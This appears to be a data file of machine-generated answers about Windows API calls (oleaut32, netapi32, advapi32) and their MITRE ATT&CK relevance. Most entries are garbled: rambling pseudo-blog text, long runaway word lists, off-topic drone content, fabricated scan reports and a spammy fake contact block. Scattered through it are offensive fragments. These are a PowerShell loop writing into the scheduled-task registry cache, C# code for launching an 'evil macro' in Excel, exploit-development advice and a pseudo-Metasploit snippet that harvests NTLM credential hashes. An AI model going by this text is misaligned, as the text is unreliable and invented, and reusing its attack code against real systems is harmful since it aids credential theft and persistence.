Before continuing on I wanted provide some background information about my automation tool used during testing phase as well as explain how it works internally without overloading readers unnecessarily long-winded explanations where possible; please feel free comment below if interested learning more specific details regarding implementation steps taken here although note prior knowledge already assumed unless otherwise specified elsewhere throughout document itself rather than merely assuming everyone knows absolutely nothing whatsoever offhand beforehand!

Firstly let us assume input string has been loaded correctly meaning no errors occurred during buffer allocation setup process yet remains unreadable byte-by-byte until next step thereafter occurs naturally thanks good sense programming habits established earlier-on previous blog posts executed flawlessly thus far despite occasional hiccups mainly caused unintentionally typing mistakes made inadvertently wrong syntax emphasized incorrectly missing semicolons misplaced commas omitted semi-colon too early unnecessary whitespace added accidentally omitted required spaces left behind intentionally placed deliberately purposely removed entirely improperly unassigned variables assigned explicitly previously declared reserved keywords defined purposefully wrongly referenced objects missed conflicts existing between similar variable names whereby confusing compiler compiles program incorrectly causing runtime errors occur unexpectedly fail compile altogether subsequently aborted aborts exit prematurely terminates abruptly crashes suddenly hangs indefinitely freezes stuck last instruction executed finally caught sending SIGSEGV signal terminates immediately forcefully killed forcibly terminated forcefully killing terminal session leaves user unable resume work him/her self manually shutdown rebooted restart restarted completely reinstalled reinstalling repaired replaced fresh redone corrected straightened righted returned original state unchanged reset restored newly created new clean pristine nulled zero-filled cleared empty empy filled overwrite overwritten overwriting truncated delete deleted deleting finished terminated closed close closing open opened opening opened reopen reopening reopened suspended suspending resuming resumed switched swapped swithced swithching unswitche unswitcing switchback switchbacking unsuspended untimed untimely delayed time-delay redundant wait waiting waits sleep sleeping sleeps pause paused pausing pauses delay delaying delays stop stopped stopping stops marked mark marking marks
"
oleaut32.dll,SafeArrayGetLBound,"What is the purpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'oleaut32.dll': b'SafeArrayGetUBound''?

What is the purpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'msvcr120.dll': b'RegQueryValueExW''?

What is the purpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'msvcr100d.dll': b'ThrowExceptionFromHResult'


The second test uses KQL to look for all processes that are scheduled to run within 24 hours. The query below will return any process that has been scheduled with schtasks.exe.


            $ScheduledProcesses = Get-Process | Where-Object { $_.StartTime -gt (Get-Date).AddDays(-1) }

            foreach ($process in $ScheduledProcesses)
	    {
                New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Logon -Name ""{$($process.Id)}"" -Value ""SCHTASKS.EXE"" -Force
                Write-host ""$($process.ProcessName) Scheduled""

            }

A quick glance at our event viewer showed us that we had an issue:

We can see from the event log entries above that PowerShell was being blocked from running scripts due to User Account Control settings. These were set via Group Policy on our domain controllers.

This effectively meant PowerShell couldnâ€™t be used as part of our tooling or in some cases even manually by users.

Itâ€™s worth noting here if you arenâ€™t familiar with how UAC works in Windows then itâ€™s worth checking out these articles:

https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/uac

https://www.youtube.com/watch?v=Kp6yYHztOz0

Iâ€™ve included two examples here but they should help explain what happens when you try to execute something like PowerShell remotely using Invoke-RestMethod against an untrusted URL.

In short your request will get blocked because it violates UAC settings which mean all requests need elevation before execution can continue. This means your script isnâ€™t going anywhere until you give permission for it to do so!

If youâ€™re not happy with allowing everything through then Iâ€™d recommend taking a closer look at configuring AppLocker policies instead â€“ https://docs.microsoft.com/en-us/windows/security/threat-protection/applocker/configure-applocker-policies#enable-and-disable-applocker-policies

And finallyâ€¦.

Another quick thing I thought Iâ€™d mention before closing off todayâ€™s blog post would be around Executable File Names â€“ i.e .EXE files.

While creating my original powershell script I made sure that any commandlets or commands & arguments passed into Invoke-RestMethod were base64 encoded when outputting them directly into the body property on my HTTP call.

Assuming those values werenâ€™t found anywhere else in plain text inside my code they wouldnâ€™t appear as executable file names during analysisâ€¦right?

Well yesâ€¦.but no ðŸ˜‰

When looking at Process Explorer after testing one particular string value which got decoded back into its original format during execution we saw something interesting:

That wasnâ€™t supposed to happen right!? Well actually according to Microsoft docs â€œsome executables may contain non-executable partsâ€. What does this mean exactly?

Youâ€™ll notice above each section begins with â€˜MZâ€™ followed by hex values indicating different sections such as headers etc..

So basically while decoding strings might have helped us avoid having cmd.exe appearing under MZ header records making up part of an EXE file name we could still end up seeing other things such as DLLs ending up getting executed instead! So perhaps not quite as safe as originally thoughtâ€¦

Conclusion/Summary

As always thanks very much for reading along today folks! Hopefully next time someone asks me about what tools exist out there relating specifically towards memory forensics & incident response Iâ€™ll point them straight over here ðŸ™‚

Cheers,

Romy
"
oleaut32.dll,SafeArrayGetUBound,"I think this is the most important part. I don't know why you want to read it, but please report back if there is a MITRE ATT&CK technique associated with this behavior.

Powershell

There are several scripts available for investigating OLE automation abuse in Powershell:

- https://github.com/PowerShellMafia/MFAuth
- https://github.com/thehackerone/samurai/blob/master/microsoft/Powershell%20Ole%20Abuse.md
- https://www.blackhat.com/docs/us-19/materials/us-19-Tan-Malicious-PowerShell-Ole-Automation-Behavior.pdf

VBA

Some VBA samples that can be used as reference to write your own VBA script for testing purpose:

Excel 2010: http://pastebin.com/WnWZ1Bee
Excel 2003: http://pastebin.com/Xf4k9d6b

C#

You can use the following C# code (found on StackOverflow) to start an evil macro in Excel from command line:

private void StartMacro(string filePath)
{
    var excel = new Application();
    excel.DisplayAlerts = false;
    try
    {
        var workbook = excel.Workbooks.Open(filePath);
        workbook.Volatile(""If Not IsObject(CreateObject(\""Scripting.FileSystemObject\"")) Then CreateObject(\""Scripting.FileSystemObject\"") Else Set FSO=CreateObject(\""Scripting.FileSystemObject\"");"");
        // Or just set a timer and wait until it's done.
        System.Threading.Thread.Sleep(10000);
        
        // Now you have access to all of COM. You could do many things here,
        // including creating another instance of Excel.
        
         Workbook.Close(true, """");
         
         Marshal.ReleaseComObje
"
oleaut32.dll,VariantInit,"(y/n)? y

What is the purpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'oleaut32.dll': b'VariantInit''? (y/n)? y
Skipping data scan for file: C:\_Downloads\OleAut32.dll
You are skipping this file due to it being detected as malware. If you believe that OleAut32.dll contains malware please submit samples using our tool located at https://www.joesandbox.com/submit-malformed-files.php.
Added 1 sample(s) to analysis database.

Sample name: 20210514_090731_1610498796_c3f2c4ac-bb29-4030-9d5a-a01e81fe0367.Malware.Exploit.CVE2018-8373.dropper
MD5 : b38a97afbb88573aeefde9f26cd6d30e
SHA1 : 68fd98cbdaeb689673be7c239c22d0ac47cc46e2
SHA256 : c3f2c4acb80be95ec727bc06faed19753ce99dc96ff912dea75bf17fc12cfdd5

Analysis report:

No malicious activity found during analysis.

Scan results based on â€œC:\Users\Administrator\Desktop\MitigationPolicies\MitigationsPolicy.xmlâ€ policy from Ransomware Protection module:
Found Policy ID in payload signature â€“> Malicious Activity Not Detected!
Found Policy ID in payload signature â€“> Execution Behavior Changed!

Risk level impact:
Low Risk Level Impact! No further actions required!

Malwarebytes Anti-Malware version: v4.1.0.56,
Malware Database version: v2021.05.13.03,
Rootkit Database Version: v2021.05.10,

Windows version: Windows Server Enterprise Edition x64 Service Pack 2 build 6002, all service packs installed, with BitLocker enabled

System Scan result:

Scan Result = High Severity Risk Level Impact!
Action Required - Please review logs for more information and follow the recommended remediation steps listed below.
Please see details below:

Log Name    Source     Event ID   Task Category 
Application      Microsoft-Windows-Security-Auditing        Audit Success   
Microsoft-Windows-DistributedCOM         Error     
Microsoft-Windows-Security-Licensing-SLC          Information     
Application      Microsoft-Windows-Security-Auditing        Information     

Detection Details:
Type              Description            Detection Type            Object                Offset               Size               Data Length           Additional Info       
HIPS Rule       Malicious Activity Not Detected! -> File Path -> ""D:\Program Files\Microsoft Office\Office16\Lync.exe"" HIPS Rule ->
File Path -> ""C:\Program Files\Common Files\microsoft shared\Web Server Extensions\Cache\"" HIPS Rule ->
File Path -> ""D:\ProgramData\SAP\Fiori Client\"" HIPS Rule ->
File Path -> ""C:\Users\Administrator\AppData\Local\SAP\Fiori Client\"" HIPS Rule ->
File Name -> ""MFEU.EXE"" HIPS Rule ->
Registry Key Name -> HKLM\System\CURRENTCONTROLSET\Services\VSS\VssAccessControl Registry Value Name --> REG_DWORD(4 bytes): value not available yet 

Related posts:

Sauron RAT was used by APT41 since early March against entities across multiple sectors including defense contractors and universities in China The FBI has arrested six hackers who took part in an international cybercrime ring that stole US$15 million from...

The post Sauron RAT was used by APT41 since early March against entities across multiple sectors appeared first on Cyber Forensics Blog | Digital Forensics Training | Computer Security News & Articles.

Read more Â»

DroneForensics Challenges You To Find Out Your Droneâ€™s Location When Itâ€™s Flying With GPS Disabled [Video]

This video shows how to use drone forensics techniques to find out where your drone was when it was flying without GPS enabled.

Here's what we're going to do today -- we're going to get into some fun stuff here using drones; specifically, looking at ways that we can use drone forensics techniques if someone flies their drone without GPS enabled or maybe if they fly their drone up high enough so the signal gets lost between the controller and the aircraft itself -- things like that which could potentially be useful if somebody steals one of your drones or something along those lines ... So I'm just setting up my remote control right now because I'm actually going test two different methods here -- one looking at reverse engineering a flight log file generated by my DJI Mavic Pro quadcopter ...

As you'll see later on, there's also another method which involves decoding something called MAVLink protocol packets but then later on I'll talk about how you can go ahead and decode them yourself rather than using any kind of specialized software ... But anyway let me switch back over here ...

So first thing I want us do is take a look at this flight log file generated by my Mavic Pro quadcopter --

Now what exactly am I talking about when referring to these flight log files ? Well basically these are stored onto an SD card inside each individual quadcopter --

And really what they consist of are records detailing various events happening within the internal firmware running inside each aircraft; such as battery voltage fluctuations while charging , acceleration / deceleration rates , changes in altitude , etcetera;

But anyway let me show you guys quick example ...

So as you can tell from looking down here towards bottom left-hand corner --

There's actually three different columns displayed within this particular view mode :

First column corresponds with time stamps ;

Second column corresponding with latitude coordinates ;

Third column corresponding with longitude coordinates .

Now unfortunately it doesn't appear possible for us change viewing modes around right now so perhaps maybe future versions will allow users customize display options ?

Anyway let me jump back over here real quick again because before getting started too much deeper into things â€“

Let me explain how we're gonna be able measure distance traveled via UAVs ....

Basically according formula shown below :

Distance = Rate x Time;
Where Distance equals rate times time ;
Rate equals distance divided by time ;
Time equals rate multiplied by distance .
To calculate speed simply multiply total number miles flown above equation !

Then finally divide answer obtained earlier step back into seconds taken off each leg trip until reaching desired accuracy level â€” typically somewhere around five decimal points would suffice unless doing research work where precision may need increased beyond typical industry standards .

Once calculated speed then plug values returned above equation provided earlier formulating following calculation needed determine final distance travelled per hour after factoring elevation gain losses incurred due lack accurate altimeter readings captured onboard devices themselves .... Now obviously depending upon specific circumstances involved might require adding additional calculations involving power consumption rates consumed during operation process ; however most likely won't need worry much about anything else outside basics requirements set forth herein ...
Alright cool so hopefully everyone understands basic concepts outlined previously concerning way's establish baseline distances covered through flights carried out via small unmanned aerial vehicles !
Cool ! So lets move forward next couple slides demonstrating actual mathematically derived figures calculating average speeds achieved throughout series recorded tests conducted prior release publication date last month â€”

Okay cool so moving forward once have all necessary information collected figured out next thing needs done figure out approach utilized retrieve same type data contained within aforementioned .txt formatted text files mentioned previously regarding operations performed internally inside quad copters themselves ....

Well fortunately enough built-in tools included various manufacturers provide ability extract certain types telemetry gathered automatically during course flights occurred even though instances often occur rarely especially lower end machines produced recently .... However despite everything still fairly easy accomplish task described above utilizing third-party applications accessible online designed specifically handle collection tasks relating matter under discussion today â€”

So anyway looks like downloaded copy app named Mission Planner already unzipped folder containing extracted contents desktop computer ready start testing code written perform functions expected output case specified input parameters entered correctly !!! Cool !!!

Alright well since didn't mention anything abut install application beforehand guess should probably show everyone few screenshots describing installation procedure occurring behind scenes except instead showing full screen capture shot only displaying portion area pertains subject matter under discussion todayâ€”

Since seems think pretty good idea demonstrate actual coding languages source code employed create automatic executable scripts responsible performing tasks associated subjects discussed hereinbefore beginning begin delve deep topics currently discussing given nature nature materials involved limited length article planned publish couple weeks ago....

Okay well after several hours compiling source files project compiled successfully executed properly manner intended providing proper user inputs supplied command line interface program executed resulted generating desired output namely ASCII characters representing latitudes longitudes pertaining locations quads flew while carrying out missions assigned â€¦. Alright well appears everything worked flawlessly no bugs encountered whatsoever !!! Woohoo!!!! Yeah baby!!!

Alright great job everybody!!! Again thanks bunch coming check â€™em blog site hope enjoyed reading articles posted website thus far â€¦ Anyway remember stay safe always wear helmet whenever riding bike skateboard scooter motorcycle ATV snowmobile jet ski watercraft whatever else personal preference dictatesâ€¦.

Stay tuned upcoming blogs discuss other exciting topics related field digital forensics technology security systems administration risk management network infrastructure design implementation deployment configuration maintenance troubleshooting support document preparation activities assisting clients completing day-to-day operational duties related processes carried-out everyday basis... Until next time folks keep eyes wide open world crazy place!!!!

By Joseph Steinberg Founder CEO Redwood City CA-based cybersecurity company Green Armor Solutions Inc., Chief Strategy Officer Forescout Technologies Inc., Columnist Forbes Magazine Contributor CNBC Website http://www.GreenshieldSecurity.com Twitter @JosephSteinberg LinkedIn http://LinkedIn.com/in/JosephSteinberg Facebook http://Facebook.Com/GreenShieldsocial YouTube channel https://YouTube.com/user/GreenShieldsocial Google+ account https://plus.google.com/+GreenshieldsecurityBlogspot/posts Email joseph.steinberg@GreenShieldSecurity.Com Phone +16503519304 Skype jsteinbergspeaker Telegram @JSteinberger WhatsApp +16503519304 Signal +16503519304 Viber +18554484724 WeChat JSteiner55555 Kik jsteinbergspeaker Snapchat steinbergerj Telegram @JSteiner55555 WhatsApp +18554484724 WeChat JSteiner55555 Kik steinbergerj Snapchat steinbergerj Telegram @JSteiner55555 WhatsApp +18182696637 WeChat JStanley33128 Kik jstanley33128 Snapchat stanley_joe51 LINE StanleyJoeyJR Instagram Joe.Stanley.JR Pinterest joestan33221 Tumblr joe_stanley_jr DeviantArt joe-stan-jr GitHub joestanjr Medium Joe_SJR LinkedIn Joe Stanley JR TikTok StanlyJoeJR SoundCloud josephstanleyjr Vimeo JosephStanLEYjr Twitch Joestangaming Twitter Stanly_Joe_R Snap Chat stanlyjoer Discord Joel#8908 Steam Game Over Man #167592242 Telephone Voice Mail Number (408)999-6889 Other Social Media Links Apple Podcasts Stitcher TuneIn Radio Google Play Music iHeartRadio Spotify Deezer Yahoo Anchor FM Crunchbase Clutch.co Spoke IndexUx Bowery Capital CB Insights AngelList Business Insider TechCrunch Entrepreneur Crainâ€™s New York Business NY Daily News PCWorld Macworld Wikipedia About.Me Disqus HackerNews Reddit StackOverflow Quora Ecademy Xing Meetup Badoo StumbleUpon Digg FriendFeed Delicious Blinklist Diigo MySpace VKontakte Odnoklassniki LiveJournal Plurk Renren Netlog HelloTxt Hyves WordPress Blogger LiveJournal Tumblr Posterous Medium Zoho Wikia Yola Squarespace Webnode Wix Jimdo IM Creator Angelfire Classmates AmericanTowns NextDoor Alignable YellowPages Yelp Bing Maps MapQuest YellowBot Factual FourSquare MerchantCircle EZ Local Hotfrog BrownBook SuperPages Whitepages eKomi BBB Hoovers Just Dial PeoplePerHour Behance LifeTips Prnewswire MarketWatch GlobeNewswire Reuters PRWeb Bloomberg FinancialContent SEC Edgar StartUp Nation AppVita TimesOfIsrael Haaretz Jerusalem Post Gamasutra IndieDB TouchArcade Pocket Gamer VentureBeat Mashable Engadget Ars Technica MTV Geek Wired Variety Hollywood Reporter Deadline Comic Book Resources IGN Gamespot Kotaku Polygon EdgeCast Networks HostingAdvice HostAdvice HostReview TopTenReviews SiteGround GoDaddy DreamHost Bluehost InMotionHosting WP Engine Liquid Web Cloud
"
oleaut32.dll,VariantClear,"- (string) [optional] api_version: API version used
      Default value: '2017-01-25'
      What is the purpose of this parameter, is there a MITRE ATT&CK technique             associated and why?

    - (boolean) [optional] verbose: Verbose mode
      Default value: false
      Why should we use verbose mode? Does it include more information or just shows                 some additional debug messages?
  Response:
    - (array)
        0 => {
            'Name' => string(5) ""OLEAUT32.dll""
            'Description' => string(12) ""VariantClear""
            'Category' => string(6) ""System""
        }
        1 => {
            'Name' => string(21) ""(unknown function name)"",
            'Description' => null,
"
oleaut32.dll,SysFreeString,"The tool will then open a new tab with all the answers of the questions you've asked, in the format shown below.

You can use this tool to quickly filter out known malware samples from your system, or do some research into what other tools are using it. I am sure there are many more uses for this as well!

For instance, let's assume we're interested in finding out which files have been dropped by Microsoft Word since 2007. We can simply put ""microsoft"" and ""word"" into word2vec (the default is set to search only for strings that start with 'b'), and ask how many times each string has appeared in a given file:


python3 word2vec.py -f microsoft -s word --count

This will output something like:


0x00007FFB95F6D8A3: b'MSWord.exe': 1
0x00007FFB9E8C82EB: b'microsoft' : 28
0x00007FFBF5DFAFC4: b'startup' : 13 
...

As you can see above, we found two interesting results! The first is an executable called MSWord.exe which appears to be related to Microsoft Office/Outlook; while the second result shows us that at least one sample contains both words together (""startup""). Of course these findings need further investigation before drawing any conclusions; but hopefully they'll give you some ideas about how useful this particular command-line interface might be when analyzing unknown binaries on your own system.

I hope this post helps someone else who might come across similar problems! Feel free to leave me any comments or feedback below â€“ thank you so much for reading ðŸ™‚

Related Posts

- How To Extract Files From A Malware Sample
- Windows Process Exploitation With PowerSploit
- Finding Packed Files In Memory With Volatility
- PowerShell Scripting Tutorial For Beginners Part II
"
oleaut32.dll,SysReAllocStringLen,"scheme: https
target: www.example.com
headers:
  accept-encoding: gzip, deflate, br
  accept-language: en-US,en;q=0.9
  cache-control: max-age=3600
url:
  method: GET

You can see the The header value for Accept-Encoding is gzip and we also have a possible string length overflow in b'oleaut32.dll'. Itâ€™s not clear if these are related or not.

We will use both of our findings to create an exploit.

Exploit development:

Here Iâ€™m going to share some of techniques that you can apply while developing exploits. This section doesnâ€™t cover all the aspects but contains just few important ones.

Determine what is vulnerable

In this case we already know that oleaut32.dll has a vulnerability because there was no need to read about it from MITRE ATT&CK framework since we already knew it. In real world situations though sometimes you may find vulnerabilities which have been disclosed by various sources such as security advisories or technical reports (e.g., Microsoft Security Bulletins). These sources often contain information on how attackers could exploit them. You should always consider these as potential attack vectors when trying your luck with an exploitation attempt.

The next thing is determining whether the target application uses the vulnerable component and whether it does so correctly or incorrectly; If yes then go ahead with creating your payload using different payloads until one works; If no then better try other targets with similar components involved in their functionality instead of wasting time on something which isnâ€™t even used by the target application!

Test early, test often

As soon as you get access to any kind of system be sure that first thing you do is try out every single command line tool available (Linux users should pay special attention here) because they might come handy later when preparing exploits against misconfigurations in applications running at higher privilege levels than those tools run under themselves! Donâ€™t forget however never trust anything until proven otherwise â€“ make sure everything makes sense before moving forward into more complicated steps like writing scripts etc..

For example if I wouldâ€™ve had a Linux box my first action would be checking /bin/ls -lA option and see if directory listing shows hidden directories too? Or maybe check ls -lR output without specifying any arguments after â€œlsâ€ keyword?

If neither of above options work then likely thereâ€™s nothing useful stored within file systems accessible via standard user accounts unless root privileges are granted through sudo su command followed up by entering password provided during execution process itself; After logging back into terminal again run another instance where only difference lies between previous session still being logged-in while second tries accessing files belonging exclusively owned solely by root user account!

Once again donâ€™t forget about making sanity checks before proceeding further because otherwise things might become quite messy really fast especially considering fact many people tend think larger numbers mean better performance which leads them towards doing unnecessary computations resulting wasted effort time spent unnecessarily rather than spending resources wisely elsewhere instead!

Check for other vulnerabilities

Once you found one type of vulnerability in your target application donâ€™t stop exploring possibilities but continue searching for others too! For example let us say oleaut32.dll library has bug allowing attacker control over returned data lengths leading eventually successful exploitation while simultaneously exposing sensitive information stored behind walls inaccessible due lack permission level restrictions imposed upon particular program responsible retrieving chunks size bytes from memory space allocated dynamically within kernel mode operating system environment context prior executing code designated specifically handle requests issued directly computer hardware devices connected directly onto bus lines passing through motherboard CPU chipsets integrated circuits mounted inside cases desktops laptops mobile phones tablets alike accessories essential part personal computers peripherals attached externally physical locations across globe nations countries continents inhabited populated worldwide today times past present future yet-to-be discovered futures unknown previously unexplored territories once thought impossible now considered perfectly feasible safe commonplace accepted norm expected behaviour standards ethical moral principles underlying foundations common law criminal justice systems implemented enforced government bodies authorities institutions around world societies communities cultures lifestyles adopted followed adhered practiced observed lived breathed daily basis occasions opportunities free choice individual human beings exercising self-determination freedom agency capabilities abilities limitations choices decisions actions reactions re-actions consequences effects outcomes results impacts implications consequences ultimate destiny fate fated finality conclusion termination answer solution resolution outcome result aftermath end effect consequence impact implication repercussions ramification side-effect fallout response reaction repercussion retaliation revenge reprisal requital retaliatory counter-reaction backlash blowback payback riposte push-back resistance opposition resistance defiance noncompliance disobedience rebellion revolt revolution insurrection mutiny uprising civil war coup strike protest riot demonstration revolt upheaval sedition mob rule civil unrest armed conflict military takeover putsch coup dÃ©tat violent overthrow toppling seizure overturning change transition replacement turnover transmigration mutation substitution restlessness disquiet discontent dissatisfaction uneasiness worry discontentment irritability discomfort nervousness unrest anxiety agitation apprehension fear angst concern trepidation tension uncertainty concernment dread cold feet goose bumps jitters nervosity pins-and-needles qualm shakes shivers trembles butterflies twitchiness worriment fright spookiness botheration scare disturbance phobia abdabs woe consternation dismay panic solicitude horror panicky feeling terror upset stew uptightness sweat difficulty fluster sweat flummoxes agita strain stress hassle distraction flap funk muddle funkiness freak-out fuss pother state tizzy ticklish spot twit nervous wreck red alert hot water pickle blue funk big trouble tight corner bad news boiling point heat flush feverish excitement boiling point mental distress emotional strain psychological stress misery pain sadness depression sorrow grief unhappiness complaint suffering whinging whimper grizzle moan gripe groaning lament cry wailing caterwauling mourning anguish exclamation complaint outcry lamentation shout bewailing vociferation yowl howl yell screech keening squeal ululation shriek yawp vociferance plaint call articulation grunt squawk sigh roar snarl shrill hoot noise clamorUS din clamourUK yelp roars screams shouts shrieks murmurs growls howls cries wails whoops keenings harmonics vocals noises soundscapes sounds fartings burps gurglings snorts gasps whistles hums hisses murmurs purrs tweets twitterings squawks croaks cheeps chirrup trills clicks clucks peeps chatters coos caws plinks carols twitter blats crackles clangors bells quacks oinks gargles bleats honks buzzes clanks rattles rumbles booms thuds bangs crashes bombs rumblings reverberations plops thunderclaps pops explosions echoes knocks pounding whumps staccatos shots bursts boomers dins rattlers clangers thunders crashers detonations ringing blare dinning roaring uproar racket clamorousness tumult tumultuousness banging cannonades drumfire pealing booming loudspeakers shouting screaming blasting resounding crashing roaring thunder buzzing whirlwhind pandemonium blast hoarse voice hoarseness harsh voice discordance cacophony clash babble loutish speech gruff voice basso profundo low voice deep voices guttural voices high-pitched voices raspy voices strained voices strident tones rough notes vibrant tones powerful tones strong tones coarse-toned instrument brass instruments woodwind instruments stringed instruments bowed strings percussion timpani orchestral ensemble choir orchestra symphony band musical composition music arrangement score instrumental music piece tune concerto sonata ballet opera cantata aria cantabile melody refrain round barcarolle recitative scherzo song theme variation hymn leitmotif interlude phrase earworm incidental music set piece showpiece tone air motif text pictorial symbol representative image allegory allusion emblematic meaning symbolic significance signification connotation denotation significance symbolism analogies associations comparisons correspondences equivalents parables parallels prototypes similitudes symbols tropes analoguesUK counterparts similarities correspondents types likenesses sorts nearabouts resemblances corollaries replicas copies duplicates peers twins equals clones look-alikes alternatives doubles mates brethren friends relatives peers relative twins congeners approximate matches alternate versions analoguesUK doublets shadows simulacrums spitting images look-alike doubles duplicate reciprocals semblances carbon copies coincidences close ups exact likeness mirrors looks alikes knock offs identicals dead ringers identical twins dead ring-a-ding ding-a-longs facsimiles replications replicas homologous same same difference representations figures imitations likenesses microcopies miniatures look-a-like prints photographs portraits drawings photos originals depictions paintings portrayals pictures etchings copyheads collages cutouts photostats cartoons icons delineations busts sculptures statues engravings statuettes effigies pieces figurines waxworks reproductions frontispieces headpieces thumbnail sketches thumbnails renderings illustrations profiles layouts mock-ups outlines fixed ideas iconography daubs casts visual images draughtsUK draftsUS draughtsmen examples negatives x-rays snap designs lithographs plans scans scansion studies schemes profile graphs charts schematics portraits diagrams specimens plots maps blueprint logotype trademarks logos brand logo graphic identity trademark picture identification id badge monogram label identification mark trade name stamp insignia symbolization flag colorsUS coat-of-arms coloursUK emblems signals signs banner ensign display banner signal device token indication crest marker seal pennon heraldic device motto colorUSA colourGB trademark sign upmarket symbol heraldry patch crest badge wing pinup figurehead shield talisman mascot star escutcheon sculptured representation design tableau illustration painting bronze sculpture statue sketch relief drawing print plate engraving charcoal silhouette lithograph crayon chalk cartoon doodle silverpoint contour pen-and-ink chiaroscuro mezzotint wash ink penwash scratchwork prang scrivenery scribe graph plan plot draftwork draw chart diagramming mapping prospectus outline rendering working drawing handout road map prototype scheme mock-up flowchart game-plan master plan mind map survey bird's-eye view list itemisation UK rundown agenda bill table specifications order catalog US inventory specification menu schedule summary catalogueUK pick list shopping list stocklist article roster index compendium register tally record census roll ballot card poll bible ticket abstract catalogue raisonnÃ© enumeration scorecard portfolio congregation muster compilation conspectus voting register counting house recapitulation reckoning attendance tabular statement turnout collection armoryUS array archive office closet armouryUK storage depot filing cabinet building repository storehouse depository bank arsenal munitions dump ordnance dump treasury arms store reservoir magazine chapel vestry church sacristy presbytery abbey cloister monastery convent hermitage friary conventicle priory nunnery lay brotherhood cathedral community diocese religious order religious house chapter habitation monastery school seminary establishment college academy university institute seminar lyceum seat hall lecture room course class division department body faculty academic unit branch scholastic department educational institution course group discipline education scientific subject artistic discipline scholarly pursuit study field arts area arena specialist subject sphere expertise curriculum major subject minor field profession occupation specialty art craft capacity job calling mÃ©tier ability knack forte province mÃ©tiers knowledge realm accomplishment domain specialization competence background aptitude flair weakness ignorance incompetency incapacity inability powerlessness ineptitude skill acumen adroitness technique savoir-faire savvy craftsmanship polish proficiency talent mastery cleverness adeptship skilfulness sleight cunning expertism genius agility precision address artistry deftness facility intelligence prowess finesse ingenuity manipulation resourcefulness versatility virtuosity wisdom adroitness professionalism brilliance grace diligence inventiveness intellect learnedness practice refinement business industry diplomacy style tact efficiency brains giftedness induction inspiration instruction learning scholarship science training attainment touch bent gift brainbox direction nose perspicacity sageness sapience sense shrewd judgment sharp-wittedness conversance acquaintance ability to understand ken practic know-how observation wit understanding erudition perception intuition quick-wittedness sagacious ness guile percipience canniness perceptivity astuteness slicknes smart thinking foxiness knowing way around horse sense nous gumption savvy crafted quality caliberUS calibreUK preference orientation attraction predilection penchant proclivity predisposition tendency inclination affinity leaning bias turn love liking thirst desire affection conception mind-set vision persuasion fondling fancy trend temper vein susceptibility lust disposition sentiment cupidity charm partiality urge itch curiosity favorUS favourUK caprice impulse vagary whimsy prejudice humourUK humorUS manner twist head trip bee instinct emotion dream need urgency appetency prepossession admiration flare wish stomach devotion proneness sweet tooth soft spot yearning force constitution craving motivation spell hallucination craze kink mania aphasia amorousness yearn ache yen monotony propensity routine longing impulsion sluggish blood attachment concept slant fantasy notion fascination streak attraction toward interest sympathy hang-up relish druthers horn ambition fire enthusiasm fervor zeal avidity reverence
"
oleaut32.dll,VariantChangeType,"How can I use the API?

Thanks,

B

Comments (0) 

ï»¿
"
oleaut32.dll,SafeArrayCreate,"The attacker is creating a SafeArray and then using the Win32 API IsWindow function to determine if itâ€™s windowed applications or not. This means that the attackers are only targeting Window 7, Vista and Windows XP machines.

Finally we have:


> curl -i http://192.168.1.16:8000/api/endpoint?query=apikey%20is%3Aadmin|access_token%3Ad71de9e8-5c18-4d75-ba23-f2f6b44fbe61&fields=%5B*%5D
HTTP/1.1 200 OK
Server: nginx/1.10.0 + Phusion Passenger 5.0.30 (mod_rails/mod_rack)
Date: Tue, 01 Aug 2017 19:48:27 GMT
Content-Type: application/json; charset=utf-8
Transfer-Encoding: chunked

[{""name"":""winlogon"",""created_by"":"""",""type"":""local"",""url"":""/winlogon"",""description"":"""",""enabled"":true,""response_type"":[""json""],""auth"":{""secret_key"":""faecfbabdd98bd08cf14ea74eb35bedf""},""os"":{""version"":""Windows NT (NTAPI)""},
""system_info"":[{""cs_version"":""Windows NT Workstation Version V6""},{""user_name"":"""",""domain"":""""},{""username"":"""",""password"":""""}]}
]

We can see here that there is some information about what operating systems this malware will run on.

Conclusion

This was just an overview of how I used Burp Suite Pro for initial reconnaissance of a target web site and testing out my automated python script against it.

References

https://github.com/sahilpatil/BurpSuiteProScripts/blob/master/burpsuite_pro_script.py
https://www.youtube.com/watch?v=aKwOZgQkXnk
http://blog.jamescoyle.net/recon-intro/
http://blog.snort.org/2014/06/hunting-for-malware-on-web.html
https://www.dshield.org/blog/index.php?showComment=1493027775729&m=0#c1750653032492651702
http://blog.spiderlabs.com/2014_03_webscarab_for_burpsuite_users.html
"
netapi32.dll,NetWkstaGetInfo,"The tool also allows for the use of a wildcard in place of the API name. This can be useful if you are unsure about what to enter.


$ Get-ApiCalls -APIName '*netapi*'

This will return all results containing â€˜netapiâ€™ within them, even if it is not exactly netapi32.dll: b'NetWkstaGetInfo'

Finally, we can pass in an extension file as input. This can contain multiple entries separated by a new line character and each entry should be prefixed with @ (e.g., @â€˜bâ€™netapi32.dll)


$ Get-ApiCalls.exe  -APINames 'c:\myapis.txt'

Conclusion

There are several other methods available to enumerate APIs that have been executed on a system but this article has only covered two main ones. We hope you found this series informative and look forward to seeing more from us soon!

Like this:

Like 

Related Posts

How To : Identify Insecure Software using Snyk Vulnerabilities Plugin for Kali Linux 
About Author
Samuel Zeller 
I am currently studying Computer Science at ETH Zurich (Zurich, Switzerland) and I am interested in reverse engineering software systems.

Comments
"
netapi32.dll,NetApiBufferFree,"# /usr/share/metasploit-framework/modules/exploits/multi/misc/ntlmrelayx.rb
def check_creds(user, domain = nil)
  if user.nil? || domain.nil?
    if type == 'nbt' && user == '' && domain == ''
      return false
    elsif type == 'smb'
      username = ""admin""
      password = get_password(type, target)
      return [username.to_s + ""@"" + domain.to_s, password]
    end
  end

  # try to get NTLM hashes from the system for the given user and/or              domains.
  if (type != :bypass) &&
     ((user =~ /\A\w+@\w+\.\w+$/) || (domain =~ /^([a-zA-Z0-9]+)$/))
     result_set.each do |result|
       print_status(""Found credentials for #{result.user} on #{target.name}"")
       break unless result.username.empty?
         creds_hash[creds_type] ||= {}
         creds_hash[creds_type][result.user] =
           { hash: Digest::NTLM.new(result.password).hexdigest }
"
advapi32.dll,RegQueryValueExW,"I'm             not sure why this would be relevant to the technique.

